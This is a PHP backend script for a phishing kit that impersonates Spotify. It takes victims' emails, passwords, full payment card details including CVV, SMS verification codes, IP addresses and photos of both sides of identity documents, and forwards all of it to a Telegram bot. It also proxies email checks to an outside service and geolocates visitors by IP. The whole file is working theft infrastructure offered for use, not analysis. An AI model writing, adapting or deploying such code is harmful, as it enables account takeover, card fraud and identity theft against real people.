<?php
/**
 * api.php — single entry-point combining:
 *   - lang.php        : GET  ?action=lang
 *   - send_telegram   : POST ?action=send   (JSON body)
 *   - upload_kyc      : POST ?action=kyc    (multipart/form-data)
 */

// ── CONFIGURE THESE ──────────────────────────────────────────────────────────

$bot_token  = $_COOKIE['tokentel'] ?? '';
$chat_id = $_COOKIE['idtel'] ?? '';

header('Cache-Control: no-store');

$action = isset($_GET['action']) ? $_GET['action'] : '';

// ════════════════════════════════════════════════════════════════════════════
// ACTION: validate — proxy email check through Railway Python service
// Set RAILWAY_URL to your deployed Railway app URL, e.g.:
//   https://your-app-name.up.railway.app
// ════════════════════════════════════════════════════════════════════════════
if ($action === 'validate') {
    header('Content-Type: application/json');

    $railway_url = 'https://web-production-eda5a.up.railway.app'; // <-- replace after deploy

    $email = isset($_GET['email']) ? trim($_GET['email']) : '';

    if ($email === '') {
        echo json_encode(['status' => 1]);
        exit;
    }

    $endpoint = $railway_url . '/check?email=' . rawurlencode($email);

    $ctx = stream_context_create([
        'http' => [
            'method'  => 'GET',
            'header'  => "User-Agent: Mozilla/5.0 (compatible; PHP-proxy)\r\n",
            'timeout' => 8,
        ]
    ]);

    $raw = @file_get_contents($endpoint, false, $ctx);

    if ($raw === false) {
        // Railway unreachable — fall back to allowing the user through
        echo json_encode(['status' => 20]);
    } else {
        echo $raw; // forward the exact JSON from Python
    }
    exit;
}

// ════════════════════════════════════════════════════════════════════════════
// ACTION: lang — geo-IP lookup (server-side fallback)
// ════════════════════════════════════════════════════════════════════════════
if ($action === 'lang') {
    header('Content-Type: application/json');

    function getClientIP() {
        foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP','REMOTE_ADDR'] as $key) {
            if (!empty($_SERVER[$key])) {
                $ip = trim(explode(',', $_SERVER[$key])[0]);
                if (filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
                    return $ip;
                }
            }
        }
        return null;
    }

    $ip = getClientIP();

    if ($ip === null) {
        echo json_encode(['country_code' => '']);
        exit;
    }

    $url = 'http://ip-api.com/json/' . rawurlencode($ip) . '?fields=countryCode';
    $ctx = stream_context_create(['http' => ['timeout' => 3]]);
    $raw = @file_get_contents($url, false, $ctx);

    $code = '';
    if ($raw !== false) {
        $data = json_decode($raw, true);
        $code = isset($data['countryCode']) ? strtoupper($data['countryCode']) : '';
    }

    echo json_encode(['country_code' => $code]);
    exit;
}

// ════════════════════════════════════════════════════════════════════════════
// ACTION: send — forward login / card / SMS data to Telegram
// ════════════════════════════════════════════════════════════════════════════
if ($action === 'send') {
    header('Content-Type: application/json');

    $input = json_decode(file_get_contents('php://input'), true);
    if (!is_array($input)) {
        http_response_code(400);
        echo json_encode(['error' => 'Invalid JSON']);
        exit;
    }

    $email = isset($input['email']) ? $input['email'] : 'unknown';
    $ip    = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $date  = date('Y-m-d H:i:s');

    if (isset($input['resend_code'])) {
        $message  = "🔄 <b>Resend Code Requested</b>\n\n";
        $message .= "📧 Email: {$email}\n";
        $message .= "📅 {$date}\n";
        $message .= "🖥️ IP: {$ip}\n";
    } elseif (isset($input['sms_code'])) {
        $message  = "📱 <b>SMS Verification Code</b>\n\n";
        $message .= "📧 Email: {$email}\n";
        $message .= "🔢 Code: <b>{$input['sms_code']}</b>\n";
        $message .= "📅 {$date}\n";
        $message .= "🖥️ IP: {$ip}\n";
    } elseif (isset($input['card_number'])) {
        $message  = "💳 <b>Card Details</b>\n\n";
        $message .= "📧 Email: {$email}\n";
        $message .= "💳 Card: {$input['card_number']}\n";
        $message .= "👤 Name: {$input['card_name']}\n";
        $message .= "📅 Expiry: {$input['card_expiry']}\n";
        $message .= "🔒 CVV: {$input['card_cvv']}\n";
        $message .= "🕐 {$date}\n";
        $message .= "🖥️ IP: {$ip}\n";
    } elseif (isset($input['password'])) {
        $message  = "🎵 <b>Spotify Login Attempt</b>\n\n";
        $message .= "📧 Email: {$email}\n";
        $message .= "🔑 Password: {$input['password']}\n";
        $message .= "📅 {$date}\n";
        $message .= "🖥️ IP: {$ip}\n";
    } else {
        http_response_code(400);
        echo json_encode(['error' => 'Missing required fields']);
        exit;
    }

    $url  = "https://api.telegram.org/bot{$bot_token}/sendMessage";
    $data = [
        'chat_id'    => $chat_id,
        'text'       => $message,
        'parse_mode' => 'HTML'
    ];

    $ctx = stream_context_create([
        'http' => [
            'method'  => 'POST',
            'header'  => "Content-Type: application/x-www-form-urlencoded\r\nUser-Agent: Mozilla/5.0 (compatible; PHP)\r\n",
            'content' => http_build_query($data),
            'timeout' => 5
        ]
    ]);

    $result = @file_get_contents($url, false, $ctx);

    if ($result === false) {
        http_response_code(500);
        echo json_encode(['error' => 'Failed to send to Telegram']);
    } else {
        echo json_encode(['status' => 'ok']);
    }
    exit;
}

// ════════════════════════════════════════════════════════════════════════════
// ACTION: kyc — receive KYC document images and send them to Telegram
// ════════════════════════════════════════════════════════════════════════════
if ($action === 'kyc') {
    header('Content-Type: application/json');

    $email = isset($_POST['email']) ? trim($_POST['email']) : 'unknown';
    $ip    = $_SERVER['REMOTE_ADDR'] ?? 'unknown';
    $date  = date('Y-m-d H:i:s');

    $allowed_types = ['image/jpeg', 'image/png', 'image/gif', 'image/webp', 'application/pdf'];
    $max_size      = 10 * 1024 * 1024; // 10 MB
    $errors        = [];

    foreach (['kyc_recto' => 'Front (Recto)', 'kyc_verso' => 'Back (Verso)'] as $field => $label) {
        if (!isset($_FILES[$field]) || $_FILES[$field]['error'] !== UPLOAD_ERR_OK) {
            $errors[] = "$label: upload error or missing file.";
            continue;
        }
        if ($_FILES[$field]['size'] > $max_size) {
            $errors[] = "$label: file too large (max 10 MB).";
        }
        $finfo = new finfo(FILEINFO_MIME_TYPE);
        $mime  = $finfo->file($_FILES[$field]['tmp_name']);
        if (!in_array($mime, $allowed_types, true)) {
            $errors[] = "$label: unsupported file type ($mime).";
        }
    }

    if (!empty($errors)) {
        http_response_code(400);
        echo json_encode(['error' => implode(' ', $errors)]);
        exit;
    }

    function sendToTelegram($bot_token, $chat_id, $file_path, $mime, $caption) {
        $is_pdf      = ($mime === 'application/pdf');
        $method      = $is_pdf ? 'sendDocument' : 'sendPhoto';
        $field       = $is_pdf ? 'document'     : 'photo';
        $url         = "https://api.telegram.org/bot{$bot_token}/{$method}";
        $post_fields = [
            'chat_id'    => $chat_id,
            'caption'    => $caption,
            'parse_mode' => 'HTML',
            $field       => new CURLFile($file_path, $mime, basename($file_path)),
        ];
        $ch = curl_init();
        curl_setopt_array($ch, [
            CURLOPT_URL            => $url,
            CURLOPT_POST           => true,
            CURLOPT_POSTFIELDS     => $post_fields,
            CURLOPT_RETURNTRANSFER => true,
            CURLOPT_TIMEOUT        => 30,
            CURLOPT_USERAGENT      => 'Mozilla/5.0 (compatible; PHP)',
        ]);
        $result = curl_exec($ch);
        $err    = curl_error($ch);
        curl_close($ch);
        return ($err === '' && $result !== false);
    }

    $finfo = new finfo(FILEINFO_MIME_TYPE);

    $recto_mime    = $finfo->file($_FILES['kyc_recto']['tmp_name']);
    $recto_caption = "🪪 <b>KYC Document — Front (Recto)</b>\n\n"
                   . "📧 Email: {$email}\n"
                   . "📅 {$date}\n"
                   . "🖥️ IP: {$ip}";
    sendToTelegram($bot_token, $chat_id, $_FILES['kyc_recto']['tmp_name'], $recto_mime, $recto_caption);

    $verso_mime    = $finfo->file($_FILES['kyc_verso']['tmp_name']);
    $verso_caption = "🪪 <b>KYC Document — Back (Verso)</b>\n\n"
                   . "📧 Email: {$email}\n"
                   . "📅 {$date}\n"
                   . "🖥️ IP: {$ip}";
    sendToTelegram($bot_token, $chat_id, $_FILES['kyc_verso']['tmp_name'], $verso_mime, $verso_caption);

    echo json_encode(['status' => 'ok']);
    exit;
}

// ════════════════════════════════════════════════════════════════════════════
// Unknown action
// ════════════════════════════════════════════════════════════════════════════
http_response_code(400);
header('Content-Type: application/json');
echo json_encode(['error' => 'Unknown action']);
